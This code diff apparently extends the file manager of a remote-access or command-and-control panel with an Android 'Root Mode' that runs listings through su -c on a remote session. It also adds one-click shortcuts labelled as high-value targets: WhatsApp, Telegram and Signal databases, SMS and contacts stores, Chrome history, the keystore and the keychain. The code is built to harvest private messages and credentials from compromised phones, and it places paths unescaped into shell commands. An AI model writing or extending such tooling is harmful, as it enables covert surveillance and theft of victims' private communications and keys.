@@ -145,36 +145,80 @@ function FileManager({ sessionId, config, onExec }: {
   config: OSConfig
   onExec: (cmd: string, label: string) => void
 }) {
-  const [path,     setPath]     = useState(config.defaultFs)
-  const [data,     setData]     = useState<LsResp | null>(null)
-  const [loading,  setLoading]  = useState(false)
-  const [lsError,  setLsError]  = useState<string | null>(null)
-  const [search,   setSearch]   = useState('')
-  const [sortCol,  setSortCol]  = useState<'name'|'size'|'mod'>('name')
-  const [sortAsc,  setSortAsc]  = useState(true)
-  const uploadRef  = useRef<HTMLInputElement>(null)
+  const isAndroid = config.name === 'Android'
+
+  const [path,      setPath]      = useState(config.defaultFs)
+  const [data,      setData]      = useState<LsResp | null>(null)
+  const [loading,   setLoading]   = useState(false)
+  const [lsError,   setLsError]   = useState<string | null>(null)
+  const [search,    setSearch]    = useState('')
+  const [sortCol,   setSortCol]   = useState<'name'|'size'|'mod'>('name')
+  const [sortAsc,   setSortAsc]   = useState(true)
+  const uploadRef   = useRef<HTMLInputElement>(null)
   const [uploading, setUploading] = useState(false)
   const [mkdirName, setMkdirName] = useState('')
   const [showMkdir, setShowMkdir] = useState(false)
+  // Root mode: wrap ls/cat/operations in su -c '...'
+  const [useRoot,   setUseRoot]   = useState(false)
 
-  // Quick-nav paths shown when ls fails (permission denied on /)
+  // Quick-nav paths shown when ls fails
   const QUICK_PATHS = config.defaultFs.includes('\\')
     ? ['C:\\', 'C:\\Users', 'C:\\Windows\\Temp', 'C:\\inetpub']
-    : config.defaultFs.startsWith('/sdcard')
-    ? ['/sdcard', '/sdcard/Download', '/sdcard/DCIM', '/data/local/tmp']
+    : isAndroid
+    ? [
+        '/sdcard', '/sdcard/Download', '/sdcard/DCIM',
+        '/sdcard/WhatsApp/Databases', '/sdcard/Telegram',
+        '/data/local/tmp', '/data/data', '/data/user/0',
+        '/system/etc', '/proc',
+      ]
     : ['/', '/home', '/tmp', '/var', '/etc', '/opt']
+
+  // Android-specific high-value paths (accessible with su)
+  const ANDROID_ROOT_PATHS = [
+    { icon: '💬', label: 'WhatsApp DB',   path: '/data/data/com.whatsapp/databases' },
+    { icon: '✈️',  label: 'Telegram',     path: '/data/data/org.telegram.messenger/files' },
+    { icon: '📶', label: 'Signal',        path: '/data/data/org.thoughtcrime.securesms/databases' },
+    { icon: '🏦', label: 'App Data',      path: '/data/data' },
+    { icon: '👤', label: 'User Data',     path: '/data/user/0' },
+    { icon: '🔑', label: 'Keystore',      path: '/data/misc/keystore' },
+    { icon: '📞', label: 'Contacts DB',   path: '/data/data/com.android.providers.contacts/databases' },
+    { icon: '💬', label: 'SMS DB',        path: '/data/data/com.android.providers.telephony/databases' },
+    { icon: '🌐', label: 'Chrome Hist',   path: '/data/data/com.android.chrome/app_chrome/Default' },
+    { icon: '🔒', label: 'System Keys',   path: '/data/misc/keychain' },
+  ]
 
   async function ls(p: string) {
     setLoading(true); setLsError(null)
     try {
+      // If root mode, use execute su -c ls and parse output
+      if (useRoot && isAndroid) {
+        const res = await apiPost<ExecResult>(`/api/sessions/${sessionId}/execute`, {
+          path: '/system/bin/sh',
+          args: ['-c', `su -c 'ls -la "${p}" 2>&1'`],
+          output: true,
+        })
+        const lines = (res.stdout || res.stderr || '').split('\n').filter(Boolean)
+        const files: FileInfo[] = lines
+          .filter(l => /^[dlrwx\-]/.test(l))
+          .map(l => {
+            const parts = l.split(/\s+/)
+            const isDir = l.startsWith('d')
+            const name = parts.slice(8).join(' ')
+            const size = parseInt(parts[4] || '0') || 0
+            return { name, is_dir: isDir, size, mod_time: 0, mode: parts[0] }
+          })
+          .filter(f => f.name && f.name !== '.' && f.name !== '..')
+        setPath(p)
+        setData({ path: p, files })
+        return
+      }
       const r = await apiFetch<LsResp>(`/api/sessions/${sessionId}/ls?path=${encodeURIComponent(p)}`)
       setPath(r.path); setData(r)
     } catch (e) {
       const msg = String(e)
       setLsError(msg)
-      // Don't fall back to exec for every error — only for non-permission errors
       if (!msg.toLowerCase().includes('permission') && !msg.toLowerCase().includes('denied')) {
-        onExec(`ls -la "${p}"`, `ls ${p}`)
+        onExec(useRoot && isAndroid ? `su -c 'ls -la "${p}" 2>&1'` : `ls -la "${p}"`, `ls ${p}`)
       }
     } finally { setLoading(false) }
   }
@@ -297,10 +341,49 @@ function FileManager({ sessionId, config, onExec }: {
         <span />
       </div>
 
+      {/* Root Mode toggle (Android only) */}
+      {isAndroid && (
+        <div className="shrink-0 flex items-center gap-2 px-3 py-1.5 border-b border-border bg-surface/20">
+          <button
+            onClick={() => { setUseRoot(v => !v); setLsError(null) }}
+            style={{
+              display:'flex',alignItems:'center',gap:6,padding:'3px 10px',
+              borderRadius:4,fontSize:9,fontWeight:700,cursor:'pointer',fontFamily:'inherit',
+              background: useRoot ? 'rgba(185,28,28,.18)' : 'rgba(255,255,255,.04)',
+              border: `1px solid ${useRoot ? 'rgba(185,28,28,.5)' : '#2a2a2a'}`,
+              color: useRoot ? '#ef4444' : '#555',
+            }}>
+            <Shield size={10} />
+            {useRoot ? '🔓 ROOT MODE ON' : '🔒 Root Mode Off'}
+          </button>
+          {useRoot && (
+            <span style={{ fontSize:8, color:'#555', fontStyle:'italic' }}>
+              All ls/cat via su -c
+            </span>
+          )}
+          {/* Android root quick-paths */}
+          {useRoot && ANDROID_ROOT_PATHS.map(rp => (
+            <button key={rp.path} onClick={() => ls(rp.path)}
+              title={rp.path}
+              style={{
+                fontSize:8,padding:'2px 6px',borderRadius:3,cursor:'pointer',
+                background:'rgba(185,28,28,.08)',border:'1px solid rgba(185,28,28,.2)',
+                color:'#b45454',fontFamily:'monospace',
+              }}>
+              {rp.icon} {rp.label}
+            </button>
+          ))}
+        </div>
+      )}
+
       {/* Permission denied / error → show quick-nav */}
       {lsError && (
         <div className="shrink-0 px-3 py-2 border-b border-danger/30 bg-danger/5">
-          <div className="text-[9px] text-danger mb-2 truncate">{lsError}</div>
+          <div style={{ fontSize:9, color:'var(--danger)', marginBottom:6 }}>
+            {lsError.includes('permission') || lsError.includes('denied')
+              ? '🔒 Permission Denied — enable Root Mode above or navigate to accessible path'
+              : lsError}
+          </div>
           <div className="flex flex-wrap gap-1">
             {QUICK_PATHS.map(p => (
               <button key={p} onClick={() => ls(p)}
@@ -309,6 +392,11 @@ function FileManager({ sessionId, config, onExec }: {
               </button>
             ))}
           </div>
+          {isAndroid && !useRoot && (
+            <div style={{ marginTop:6, fontSize:8, color:'#b45454' }}>
+              💡 Enable Root Mode (button above) to access /data/data, /system, WhatsApp DBs, etc.
+            </div>
+          )}
         </div>
       )}
 
